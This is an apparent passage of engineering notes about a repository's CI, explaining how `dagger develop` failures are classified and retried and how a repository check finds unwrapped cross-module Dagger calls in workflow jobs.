Same class, third trigger, and the failure is the *message* rather than the verdict. `dagger develop` generates a module's SDK by fetching Go modules, so it fails for two unrelated reasons indistinguishable from outside the step: the module does not compile, or the module chain could not be fetched. One HTTP/2 stream reset from `sum.golang.org` failed a `module-test` cell with `Error: failed to apply generated code: exit code: 1` — a sentence that reads as "your code is broken" — while the line that said what happened sat roughly eight hundred lines into a Dagger TUI dump. `scripts/ci/dagger-develop.sh` wraps every site and `scripts/ci/classify-dagger-develop-failure.sh` answers one question about the captured output, on the same separate-script pattern as `classify-push-rejection.sh` and for the same reason: it is a regex against wording this repository does not own, so it is driven by real captured output in `scripts/tests/test_dagger_develop.py` rather than rotting inside a workflow condition. Three things make a regex safe here. The classification **cannot produce a green** — a fetch fault misread as permanent is reported at once, a build failure misread as a fetch fault is retried three times and then reported, and both are red; it chooses the message and the budget, never the verdict. A build failure is **never retried**, because `test_push_rejection.py` records what blind retry costs. And the wrapper reads **`PIPESTATUS[0]`, not the pipeline's status**, because dagger's output goes through `tee` and `tee` succeeds whatever it is piped — `pipefail` would carry the failure today, but a develop that reports success because the tee worked is this file's founding failure mode in the one step every later `dagger call` depends on, so a test drives the wrapper with a failing fake `dagger` on PATH rather than trusting a shell option to stay set. The retry is **not** graceful failure: an SDK that was not generated stays red at every budget. Residue: `make develop-all` still calls `dagger develop` directly, on purpose. See [specs/stop-losing-the-port-race.md](../../specs/stop-losing-the-port-race.md).

### And the wrapper only covers the module a job was named for

Same door, one module over. A `dagger call` against any *other* module generates that module's SDK implicitly, inside the call, where the classifier cannot reach it — `ci.yml`'s `src/security` cell runs `dagger -m ./src/build`, and two of twelve runs died there (`load package ".": package name is empty`, `generate type defs: cannot find default codegen GraphQLMarshaller interface`) on commits touching no Go file. Each read as a compile error, neither was retried, and one cost the v3.8.1 release. The issue named one site; enumerating every `dagger -m ./src/X` against every module's `dagger.json` dependency closure found **seven**, the sharpest being `cd.yml` and `release.yml`'s `dagger functions -m "./$MODULE"` loop — the release gate itself, unwrapped. `check_cross_module_develop` (`scripts/repo_surface.py`, check 17) refuses the next one: it walks each job's lines *in order* and names every call no earlier wrapper invocation covers. Coverage means the wrapper ran against the module **or something that depends on it** (develop loads a module's dependencies, so their codegen is retried too; a git `source` widens nothing), earlier in the **same job** (no engine is shared between jobs). Traps: a multi-label arm like `src/stage-2|src/stage-4)` is covered by the **intersection** of its labels' closures, never the union — unioning lets each label vouch for the other and hides exactly the cross-call the issue did not know about; prose is stripped before matching, because the first version read `dagger functions -m ./src/stage-N` out of a header comment and reported a module that does not exist; and a pinned consumer reference is left alone, since no develop here could generate it. Each mechanism was mutated and the suite re-run — every mutation fails exactly the one test that claims it. See [specs/develop-every-module-a-job-calls.md](../../specs/develop-every-module-a-job-calls.md).
